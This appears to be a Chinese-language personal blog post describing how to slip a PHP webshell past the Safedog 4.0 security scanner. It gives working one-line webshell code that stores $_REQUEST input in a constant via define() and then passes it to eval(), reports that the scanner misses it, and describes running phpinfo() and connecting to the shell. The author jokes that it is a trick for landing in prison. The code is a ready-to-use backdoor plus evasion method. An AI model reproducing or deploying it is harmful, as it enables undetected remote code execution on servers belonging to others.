---
layout: post
title:  "安全狗4.0版本绕过"
categories: waf
tags: waf
author: young
---



* content
{:toc}








今天写一篇文章，关于webshell绕安全狗的（一个入狱小技巧~~）

![图片1.png](https://i.loli.net/2020/02/26/rRHUL9BYu75w4mj.png)

直接下载apache最新版的安全狗，4.0的这个版本~~~

![图片2.png](https://i.loli.net/2020/02/26/POAMZJfa37QjBDc.png)

然后进行安装安全狗，然后略过这块安装，有手的基本都会安装~~~~~~~~~~

进入了安全狗，我们先写一个简单的一句话马

![图片3.png](https://i.loli.net/2020/02/26/vRKcmDozQtU1FsG.png)

看准路径，我们在安全狗里面的 自定义路径扫描

![图片4.png](https://i.loli.net/2020/02/26/WxIk8u5av7YMXOV.png)

![图片5.png](https://i.loli.net/2020/02/26/IZWNmijvFM9aXo2.png)

选择我刚刚的那个文件夹，然后扫描这个文件夹的所有文件。（然而我只有一个~~~~）

然而今天，我分享一个骚姿势，每日一个入狱小技巧~~~~~~~

通过定义常量，而绕过安全狗

用到define() 这个函数~~

![图片6.png](https://i.loli.net/2020/02/26/UZFkt8pHewPBqJr.png)

参数name，就是定义的这个常量名，value就是定义常量值。这两个是必需的

就这样开始定义

```php
define("hi","$_REQUEST['young']")
```

就定义了一个基本成型的一句话，然后再看一下正常的一句话

```php
<?php eval($_REQUEST[‘a’]); ?>
```

没错，就是缺少了个eval()，问题不大~~

这样看可能不太直观，我按换行一下

```php
<?php
define("hi","$_REQUEST[young]");
?>
```

是不是看的很直观，很眼熟。成功的定义完常量后，我们再把它代入eval()
前面已经说了定义常量，前面这个hi，是常量名称
后面双引号里面就是值，所以我们把 hi 这个名称，代入eval()
就可以了

```php
<?php
define("hi","$_REQUEST[young]");
eval(hi);
?>
```

![图片7.png](https://i.loli.net/2020/02/26/fwFTmO4YvQZ9n3U.png)

这时候我们保存进去，再用安全狗扫一下，依然是选择这个demo文件夹里面的内容

![图片8.png](https://i.loli.net/2020/02/26/jFIGNqSsgRobprA.png)

![图片9.png](https://i.loli.net/2020/02/26/3RF5CuLKgervE9P.png)

于是乎成功的绕过了，是不是很简单~~~

所以其实绕waf不是很难，咳咳

![图片10.png](https://i.loli.net/2020/02/26/QnUGkmJ84aWytxg.png)

是不是很奇怪，嘿嘿，其实我们要传参。先执行一下phpinfo()

确认下可不可以~~~~

![图片11.png](https://i.loli.net/2020/02/26/WzEkwiRmT7YsH4O.png)

成功的执行了，这时候我们在连接这个webshell

![图片12.png](https://i.loli.net/2020/02/26/knCjA1PTWHVy7xL.png)

然后就成功的连接啦~~~~~

如果文章可以的话我后期分享一个绕d盾的~~~~
